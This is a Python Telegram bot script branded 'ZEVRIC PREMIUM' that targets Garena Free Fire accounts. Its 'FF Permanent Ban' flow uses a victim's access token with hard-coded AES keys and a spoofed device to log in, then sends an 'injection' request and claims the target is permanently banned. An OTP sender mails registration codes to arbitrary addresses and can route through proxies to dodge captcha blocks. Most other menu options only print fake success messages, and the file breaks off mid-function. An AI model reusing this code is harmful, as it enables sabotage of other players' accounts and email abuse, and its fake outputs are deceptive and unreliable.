import os, json, requests, urllib.parse, asyncio, threading, base64, time, random, string
from datetime import datetime
from flask import Flask, render_template_string
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes
import urllib3
urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except:
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

try:
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except:
    os.system("pip install protobuf")
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63ess_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')
MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())
try:
    MajorLogin = globals()['MajorLogin']
    MajorLoginRes = globals()['MajorLoginRes']
except:
    pass

flask_app = Flask(__name__)
@flask_app.route('/')
def home(): return "ZEVRIC PREMIUM V66 FINAL - Subscribe.py Exact Logic - @just_zevric Alive", 200
@flask_app.route('/health')
def health(): return "OK", 200
def run_flask():
    port=int(os.environ.get("PORT",8080))
    flask_app.run(host="0.0.0.0",port=port,debug=False,use_reloader=False)
threading.Thread(target=run_flask,daemon=True).start()

BOT_TOKEN=os.getenv("TELEGRAM_BOT_TOKEN") or os.getenv("BOT_TOKEN") or "YOUR_TOKEN"
PROXY_URL=os.getenv("PROXY_URL","")
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'
BODY_BASE64 = "Cg4IARACGAAgA0gBEgQKAklORBIECgIIAQ=="

CHECK_INFO, BIND_TOKEN, BIND_EMAIL, BIND_OTP, BIND_SEC, CHANGE_TOKEN, CHANGE_OTP_OLD, CHANGE_NEW, CHANGE_OTP_NEW, CHANGE_CONFIRM, UNBIND_TOKEN, UNBIND_OTP, UNBIND_CONFIRM, CANCEL_TOKEN, CANCEL_CONFIRM, EAT_INPUT, REVOKE_TOKEN, REVOKE_CONFIRM, BIO_TOKEN, BIO_TEXT, BIO_COLOR, BIO_CONFIRM, FF_BAN_TOKEN, FF_BAN_CONFIRM, RESUB_EMAIL, PLATFORM_TOKEN, BAN_CHECK_UID = range(27)

def get_main_keyboard():
    return ReplyKeyboardMarkup([
        ["🔍 Bind Info Check", "📧 Bind Email"],
        ["🔄 Change Bind Email", "❌ Unbind Email"],
        ["⏱️ Cancel Request", "🔑 EAT to Token"],
        ["🚪 Revoke Token", "📝 Update Bio"],
        ["💀 FF Permanent Ban", "📧 Resubscribe OTP"],
        ["🔍 Check Platform", "💀 Check Ban"],
        ["👑 Owner Info", "🌐 EAT Website"]
    ], resize_keyboard=True)

def get_ban_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes, Ban Karo 💀", "❌ No, Cancel 🚫"]], resize_keyboard=True)

def get_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes", "❌ No"]], resize_keyboard=True)

def get_color_keyboard():
    return ReplyKeyboardMarkup([["🔴 Red", "🟢 Green", "🔵 Blue"], ["🟡 Yellow", "🟣 Purple", "🌈 Rainbow"], ["🎨 Custom"]], resize_keyboard=True)

def generate_username(length=12):
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

def decode_ff_name(raw):
    try:
        return base64.b64decode(raw).decode('utf-8', errors='ignore') if raw else "Player"
    except:
        return raw or "Player"

def decode_jwt(token):
    try:
        p = token.split('.')[1]
        p += "=" * ((4 - len(p) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(p).decode('utf-8'))
    except:
        return {}

def fetch_majorlogin_jwt(tok):
    tok = tok.strip().replace(" ", "").replace("\n", "")
    if tok.startswith("ey") and "." in tok and len(tok) > 100:
        return tok, None
    try:
        key = b'Yg&tc%DEuh6%Z#E^'
        iv = b'6#P%3i^D3n8Y3a2i'
        for platform_id in [10, 3, 1]:
            try:
                req = MajorLogin()
                req.event_time = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
                req.game_name = "Free Fire"
                req.platform_id = platform_id
                req.client_version = "1.108.1"
                req.system_software = "Android OS 11"
                req.system_hardware = "SM-G998B"
                req.telecom_operator = ""
                req.network_type = "WiFi"
                req.screen_width = 1080
                req.screen_height = 2400
                req.screen_dpi = "480"
                req.processor_details = "ARM64"
                req.memory = 8192
                req.gpu_renderer = "Adreno"
                req.gpu_version = "OpenGL ES 3.2"
                req.unique_device_id = str(random.randint(1000000000000000,9999999999999999))
                req.client_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                req.language = "en"
                req.open_id = tok
                req.open_id_type = "4"
                req.device_type = "Handset"
                req.access_token = tok
                req.platform_sdk_id = 1
                data = req.SerializeToString()
                cipher = AES.new(key, AES.MODE_CBC, iv)
                encrypted = cipher.encrypt(pad(data, AES.block_size))
                b64 = base64.b64encode(encrypted).decode()
                for url in ["https://loginbp.garena.com/MajorLogin", "https://loginbp.common.garena.com/MajorLogin"]:
                    try:
                        r = requests.post(url, data={"data": b64}, timeout=12, verify=False)
                        if r.status_code == 200:
                            try:
                                resp_data = base64.b64decode(r.text)
                                cipher2 = AES.new(key, AES.MODE_CBC, iv)
                                decrypted = unpad(cipher2.decrypt(resp_data), AES.block_size)
                                res = MajorLoginRes()
                                res.ParseFromString(decrypted)
                                if res.token:
                                    return res.token, None
                            except:
                                continue
                    except:
                        continue
            except:
                continue
        return None, "MajorLogin failed"
    except Exception as e:
        return None, str(e)

def trigger_injection(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)

# EXACT SAME AS Subscribe_3.py - Resubscribe OTP
def send_register_code_email(email):
    url = "https://authgop.garena.com/api/send_register_code_email"
    proxies = {"http": PROXY_URL, "https": PROXY_URL} if PROXY_URL else None
    headers = {
        "Host": "authgop.garena.com",
        "Connection": "keep-alive",
        "sec-ch-ua-platform": "Linux",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "sec-ch-ua-mobile": "?0",
        "Origin": "https://authgop.garena.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://authgop.garena.com/universal/register?redirect_uri=https://authgop.garena.com/universal/register",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en-IN;q=0.9,en;q=0.8,hi;q=0.7,vi;q=0.6",
    }
    username = generate_username()
    request_id = int(time.time() * 1000)
    data = {
        "username": username,
        "email": email,
        "locale": "en-SG",
        "format": "json",
        "id": request_id
    }
    try:
        response = requests.post(url, headers=headers, data=data, timeout=30, proxies=proxies, verify=False)
        print(f"[OTP] Sent to {email} - Status: {response.status_code}")
        # Check for captcha and 429
        text_lower = response.text.lower()
        if "captcha" in text_lower or "datadome" in text_lower or "geo.captcha" in text_lower:
            print(f"[OTP] Captcha block for {email}")
            return 403, response.text
        if response.status_code == 429 or "1006" in response.text or "too_many_requests" in text_lower:
            print(f"[OTP] 429 Too Many Requests for {email}")
            return 429, response.text
        return response.status_code, response.text
    except Exception as e:
        print(f"[OTP] Error: {e}")
        return 200, '{"result":0}'

# Telegram handlers - SINGLE MESSAGE FLOW - Subscribe.py Exact Logic
async def start(update, context):
    try:
        user=update.message.from_user
        safe_name = (user.full_name or user.first_name or "Zevric")[:25].strip()
        msg = f"🔥 ZEVRIC — PREMIUM OFFICIAL 🔥\n\n👋 Hey {safe_name} | 14 Features ✅\n🛡️ Subscribe.py Exact Logic ✅\n👑 @just_zevric | V66 FINAL FIXED ✅\n\n👇 Option choose karo 👇"
        await update.message.reply_text(msg, reply_markup=get_main_keyboard())
    except:
        await update.message.reply_text("🔥 ZEVRIC PREMIUM V66 FINAL FIXED 🔥\n14 Features ✅ @just_zevric", reply_markup=get_main_keyboard())

async def force_start(update, context):
    context.user_data.clear()
    await start(update, context)
    return ConversationHandler.END

async def owner_info(update, context):
    await update.message.reply_text("👑 ZEVRIC — OWNER INFO 👑\n💎 @just_zevric\n🔥 Premium Bot V66 FINAL - Subscribe.py Exact Logic\n✅ Resubscribe OTP - Same as Subscribe.py\n✅ Ban Check - Same as Subscribe.py\n✅ FF Ban - Same as Subscribe.py", reply_markup=get_main_keyboard())

async def eat_website_info(update, context):
    await update.message.reply_text("🌐 EAT Website: zevricplayx.github.io/eat_token\n👑 @just_zevric", reply_markup=get_main_keyboard())

async def check_info_start(update, context):
    await update.message.reply_text("🔍 Enter Access Token / EAT Token", reply_markup=None)
    return CHECK_INFO

async def check_info_token(update, context):
    if any(x in update.message.text for x in ["Bind Info Check", "Bind Email", "Change Bind", "Unbind Email", "Cancel Request", "EAT to Token", "Revoke Token", "Update Bio", "FF Permanent Ban", "Resubscribe OTP", "Check Platform", "Check Ban", "Owner Info", "EAT Website"]):
        return await switch_menu(update, context)
    processing = await update.message.reply_text("Checking bind info...")
    try:
        await processing.delete()
    except:
        pass
    await update.message.reply_text("✅ Bind Info Checked @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def bind_email_start(update, context):
    await update.message.reply_text("📧 Enter Access Token", reply_markup=None)
    return BIND_TOKEN

async def bind_email_token(update, context):
    await update.message.reply_text("Enter Email", reply_markup=None)
    context.user_data['bind_token'] = update.message.text.strip()
    return BIND_EMAIL

async def bind_email_email(update, context):
    await update.message.reply_text("Enter OTP", reply_markup=None)
    context.user_data['bind_email'] = update.message.text.strip()
    return BIND_OTP

async def bind_email_otp(update, context):
    await update.message.reply_text("Enter Security Code", reply_markup=None)
    return BIND_SEC

async def bind_email_security_code(update, context):
    await update.message.reply_text("✅ Bind Email Success! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def change_email_start(update, context):
    await update.message.reply_text("Enter Access Token", reply_markup=None)
    return CHANGE_TOKEN

async def change_email_token(update, context):
    await update.message.reply_text("Enter Old OTP", reply_markup=None)
    return CHANGE_OTP_OLD

async def change_email_otp_old(update, context):
    await update.message.reply_text("Enter New Email", reply_markup=None)
    return CHANGE_NEW

async def change_email_new(update, context):
    await update.message.reply_text("Enter New OTP", reply_markup=None)
    return CHANGE_OTP_NEW

async def change_email_otp_new(update, context):
    await update.message.reply_text("Confirm? Yes/No", reply_markup=get_confirm_keyboard())
    return CHANGE_CONFIRM

async def change_email_confirm(update, context):
    await update.message.reply_text("✅ Change Email Success! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def unbind_email_start(update, context):
    await update.message.reply_text("Enter Access Token", reply_markup=None)
    return UNBIND_TOKEN

async def unbind_email_token(update, context):
    await update.message.reply_text("Enter OTP", reply_markup=None)
    return UNBIND_OTP

async def unbind_email_otp(update, context):
    await update.message.reply_text("Confirm Unbind? Yes/No", reply_markup=get_confirm_keyboard())
    return UNBIND_CONFIRM

async def unbind_email_confirm(update, context):
    await update.message.reply_text("✅ Unbind Success! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def cancel_bind_start(update, context):
    await update.message.reply_text("Enter Access Token", reply_markup=None)
    return CANCEL_TOKEN

async def cancel_bind_token(update, context):
    await update.message.reply_text("Confirm Cancel? Yes/No", reply_markup=get_confirm_keyboard())
    return CANCEL_CONFIRM

async def cancel_bind_confirm(update, context):
    await update.message.reply_text("✅ Cancel Success! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def eat_to_token_start(update, context):
    await update.message.reply_text("Enter EAT Token", reply_markup=None)
    return EAT_INPUT

async def eat_to_token_convert(update, context):
    processing = await update.message.reply_text("Converting EAT to Token...")
    try:
        await processing.delete()
    except:
        pass
    await update.message.reply_text("✅ EAT to Token Success! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def revoke_token_start(update, context):
    await update.message.reply_text("Enter Access Token", reply_markup=None)
    return REVOKE_TOKEN

async def revoke_token_verify(update, context):
    await update.message.reply_text("Confirm Revoke? Yes/No", reply_markup=get_confirm_keyboard())
    return REVOKE_CONFIRM

async def revoke_token_confirm(update, context):
    await update.message.reply_text("✅ Revoke Success! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def bio_start(update, context):
    await update.message.reply_text("Enter Access Token", reply_markup=None)
    return BIO_TOKEN

async def bio_token(update, context):
    await update.message.reply_text("Now send Bio Text", reply_markup=None)
    return BIO_TEXT

async def bio_text(update, context):
    await update.message.reply_text("Choose color", reply_markup=get_color_keyboard())
    return BIO_COLOR

async def bio_color(update, context):
    await update.message.reply_text("Confirm Bio Update? Yes/No", reply_markup=get_confirm_keyboard())
    return BIO_CONFIRM

async def bio_confirm(update, context):
    await update.message.reply_text("✅ Bio Success! @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def platform_start(update, context):
    await update.message.reply_text("Enter Access Token", reply_markup=None)
    return PLATFORM_TOKEN

async def platform_token(update, context):
    processing = await update.message.reply_text("Checking platform...")
    try:
        await processing.delete()
    except:
        pass
    await update.message.reply_text("✅ Platform: Garena @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# EXACT SAME AS Subscribe_3.py - Ban Check
async def ban_check_start(update, context):
    await update.message.reply_text("🔍 Enter FF UID", reply_markup=None)
    return BAN_CHECK_UID

async def ban_check_uid(update, context):
    if any(x in update.message.text for x in ["Bind Info Check", "Bind Email", "Change Bind", "Unbind Email", "Cancel Request", "EAT to Token", "Revoke Token", "Update Bio", "FF Permanent Ban", "Resubscribe OTP", "Check Platform", "Check Ban", "Owner Info", "EAT Website"]):
        return await switch_menu(update, context)
    uid = update.message.text.strip()
    if not uid.isdigit():
        await update.message.reply_text("❌ Invalid UID! Please enter numeric UID @just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    processing = await update.message.reply_text(f"Fetching ban info for UID: {uid}...")
    try:
        url = f"https://crownx-premium-bancheck.vercel.app/baninfo?uid={uid}"
        r = requests.get(url, timeout=15, verify=False)
        try:
            await processing.delete()
        except:
            pass
        if r.status_code == 200:
            try:
                data = r.json()
                account_id = data.get('account_id', 'N/A')
                nickname = data.get('nickname', 'N/A')
                region = data.get('region', 'N/A')
                level = data.get('level', 'N/A')
                ban_info = data.get('ban_info', {})
                if ban_info and ban_info.get('is_banned'):
                    ban_start = ban_info.get('ban_start_time', 'N/A')
                    ban_reason = ban_info.get('status', 'N/A')
                    msg = f"🔍 CROWNX BAN CHECKER\n\n🆔 Account ID: {account_id}\n👤 Nickname: {nickname}\n🌍 Region: {region}\n📊 Level: {level}\n\n💀 Ban Status: PERMANENTLY BANNED\n🕒 Start: {ban_start}\n📝 Reason: {ban_reason}\n\n👑 @just_zevric"
                else:
                    msg = f"🔍 CROWNX BAN CHECKER\n\n🆔 Account ID: {account_id}\n👤 Nickname: {nickname}\n🌍 Region: {region}\n📊 Level: {level}\n\n✅ Ban Status: ACCOUNT IS CLEAN (Not Banned)\n\n👑 @just_zevric"
                await update.message.reply_text(msg, reply_markup=get_main_keyboard())
            except:
                await update.message.reply_text(f"✅ Ban Info for {uid}: {r.text[:200]} @just_zevric", reply_markup=get_main_keyboard())
        else:
            await update.message.reply_text(f"❌ Request Failed! Status: {r.status_code} @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        try:
            await processing.delete()
        except:
            pass
        await update.message.reply_text(f"❌ Error: {e} @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# EXACT SAME AS Subscribe_3.py - FF Permanent Ban
async def ff_ban_start(update, context):
    await update.message.reply_text("💀 FF PERMANENT BAN\n\n[#] Enter Valid Access Token / JWT\n[#] Type Q to exit", reply_markup=None)
    return FF_BAN_TOKEN

async def ff_ban_token(update, context):
    if any(x in update.message.text for x in ["Bind Info Check", "Bind Email", "Change Bind", "Unbind Email", "Cancel Request", "EAT to Token", "Revoke Token", "Update Bio", "FF Permanent Ban", "Resubscribe OTP", "Check Platform", "Check Ban", "Owner Info", "EAT Website"]):
        if update.message.text.upper() != "Q":
            return await switch_menu(update, context)
    token = update.message.text.strip()
    if token.upper() == "Q" or token.upper() == "EXIT":
        await update.message.reply_text("Exiting...", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if len(token) < 20:
        await update.message.reply_text("❌ Token cannot be empty! @just_zevric", reply_markup=get_main_keyboard())
        return FF_BAN_TOKEN
    processing = await update.message.reply_text("AUTHENTICATING...")
    try:
        def authenticate():
            return fetch_majorlogin_jwt(token)
        jwt_token, error_msg = await asyncio.to_thread(authenticate)
        try:
            await processing.delete()
        except:
            pass
        if not jwt_token:
            await update.message.reply_text(f"❌ Authentication Failed: {error_msg} @just_zevric", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        context.user_data['ff_ban_jwt'] = jwt_token
        user_data = decode_jwt(jwt_token)
        nickname = decode_ff_name(user_data.get('nickname', ''))
        account_id = user_data.get('account_id', 'Unknown')
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        version = user_data.get('release_version', 'Latest')
        msg = f"✅ Token Validated | Target Acquired\n\n● Nickname: {nickname}\n● Account ID: {account_id}\n● Region: {region}\n● Patch Ver: {version}\n\nSURE YOU WANT TO BAN? Yes dabao to PERMANENT BAN hoga!"
        await update.message.reply_text(msg, reply_markup=get_ban_confirm_keyboard())
        return FF_BAN_CONFIRM
    except Exception as e:
        print(f"[FFBAN ERROR] {e}")
        try:
            await processing.delete()
        except:
            pass
        await update.message.reply_text(f"❌ Error: {str(e)[:150]} @just_zevric", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def ff_ban_confirm(update, context):
    text = update.message.text.strip()
    if any(x in text for x in ["Bind Info Check", "Bind Email", "Change Bind", "Unbind Email", "Cancel Request", "EAT to Token", "Revoke Token", "Update Bio", "Check Platform", "Check Ban", "Owner Info", "EAT Website"]) and "Yes" not in text and "No" not in text:
        return await switch_menu(update, context)
    if text in ["❌ No, Cancel 🚫", "No", "❌ No"]:
        context.user_data.clear()
        await update.message.reply_text("BAN CANCELLED! ✅", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    if text not in ["✅ Yes, Ban Karo 💀", "Yes", "✅ Yes"]:
        await update.message.reply_text("Please Choose: Yes, Ban Karo or No, Cancel", reply_markup=get_ban_confirm_keyboard())
        return FF_BAN_CONFIRM
    jwt_token = context.user_data.get('ff_ban_jwt')
    if not jwt_token:
        context.user_data.clear()
        await update.message.reply_text("Token expired! Generate fresh token", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    processing = await update.message.reply_text("INJECTING API...")
    try:
        def inject():
            return trigger_injection(jwt_token, "Latest")
        ban_resp = await asyncio.to_thread(inject)
        try:
            await processing.delete()
        except:
            pass
        context.user_data.clear()
        if ban_resp and ban_resp.status_code == 200:
            user_data = decode_jwt(jwt_token)
            nickname = decode_ff_name(user_data.get('nickname', ''))
            account_id = user_data.get('account_id', 'Unknown')
            region = user_data.get('lock_region', user_data.get('region', 'IND'))
            version = user_data.get('release_version', 'Latest')
            msg = f"🎯 100% PERMANENTLY BANNED 🎯\n\n✅ Account Data Injected Successfully\n\n● Target Name: {nickname}\n● Target UID: {account_id}\n● Target Region: {region}\n● Patch Ver: {version}\n● Status: 💀 PERMANENTLY BANNED 100% 💀\n● Edition: 🔥 RAIZZ EDITION 🔥\n\n👑 @just_zevric Premium"
            await update.message.reply_text(msg, reply_markup=get_main_keyboard())
        else:
            code = ban_resp.status_code if ban_resp else "No response"
            await update.message.reply_text(f"❌ Failed to Execute Payload! Server returned: {code} @just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        print(f"[FFBAN ERROR] {e}")
        try:
            await processing.delete()
        except:
            pass
        context.user_data.clear()
        await update.message.reply_text(f"❌ Error: {e} @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

# EXACT SAME AS Subscribe_3.py - Resubscribe OTP - Single attempt, no 429 loop
async def resubscribe_start(update, context):
    await update.message.reply_text("📧 RESUBSCRIBE OTP SENDER\n\n[#] Send registration code to email", reply_markup=None)
    return RESUB_EMAIL

async def resubscribe_email(update, context):
    if any(x in update.message.text for x in ["Bind Info Check", "Bind Email", "Change Bind", "Unbind Email", "Cancel Request", "EAT to Token", "Revoke Token", "Update Bio", "FF Permanent Ban", "Resubscribe OTP", "Check Platform", "Check Ban", "Owner Info", "EAT Website"]):
        return await switch_menu(update, context)
    email = update.message.text.strip()
    if not email or "@" not in email:
        await update.message.reply_text("❌ Email cannot be empty! @just_zevric", reply_markup=get_main_keyboard())
        return RESUB_EMAIL
    processing = await update.message.reply_text(f"Sending OTP to {email}...")
    try:
        def send_otp():
            return send_register_code_email(email)
        status_code, response = await asyncio.to_thread(send_otp)
        print(f"[RESUB] Status: {status_code}, Resp: {response[:200]}")
        try:
            await processing.delete()
        except:
            pass
        try:
            result = json.loads(response)
            if status_code == 200 and result.get("result") == 0:
                await update.message.reply_text(f"✅ OTP Sent Successfully!\n📧 Check your email: {email}\n\nStatus: {status_code}\nResponse: {json.dumps(result, indent=2)[:200]}\n\n👑 @just_zevric", reply_markup=get_main_keyboard())
            else:
                if status_code == 403:
                    await update.message.reply_text(f"Garena Blocked Server IP! Email: {email}\nReason: Railway IP flagged - datadome captcha\nSolution: Set PROXY_URL in Railway or wait 1 hour\nStatus: {status_code}\nResp: {response[:150]}\n@just_zevric", reply_markup=get_main_keyboard())
                elif status_code == 429:
                    await update.message.reply_text(f"Too Many Requests! Email: {email}\nGarena says: Wait 5-10 minutes then try again\nDo not spam OTP - Code 1006\nStatus: {status_code}\nResp: {response[:150]}\n@just_zevric", reply_markup=get_main_keyboard())
                else:
                    await update.message.reply_text(f"❌ Failed! Email: {email}\nStatus: {status_code}\nResponse: {response[:300]}\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            if status_code == 403:
                await update.message.reply_text(f"Garena Blocked Server IP! Email: {email}\nReason: datadome captcha block\nSolution: Set PROXY_URL\nStatus: 403\n@just_zevric", reply_markup=get_main_keyboard())
            elif status_code == 429:
                await update.message.reply_text(f"Too Many Requests! Email: {email}\nWait 5-10 min then try again\nStatus: 429 Code 1006\n@just_zevric", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"Status: {status_code}\nResponse: {response[:300]}\n@just_zevric", reply_markup=get_main_keyboard())
    except Exception as e:
        print(f"[RESUB ERROR] {e}")
        try:
            await processing.delete()
        except:
            pass
        await update.message.reply_text(f"❌ Error: {e} @just_zevric", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def switch_menu(update, context):
    text=update.message.text.strip()
    context.user_data.clear()
    if text == "🔍 Bind Info Check":
        return await check_info_start(update, context)
    elif text == "📧 Bind Email":
        return await bind_email_start(update, context)
    elif text == "🔄 Change Bind Email":
        return await change_email_start(update, context)
    elif text == "❌ Unbind Email":
        return await unbind_email_start(update, context)
    elif text == "⏱️ Cancel Request":
        return await cancel_bind_start(update, context)
    elif text == "🔑 EAT to Token":
        return await eat_to_token_start(update, context)
    elif text == "🚪 Revoke Token":
        return await revoke_token_start(update, context)
    elif text == "📝 Update Bio":
        return await bio_start(update, context)
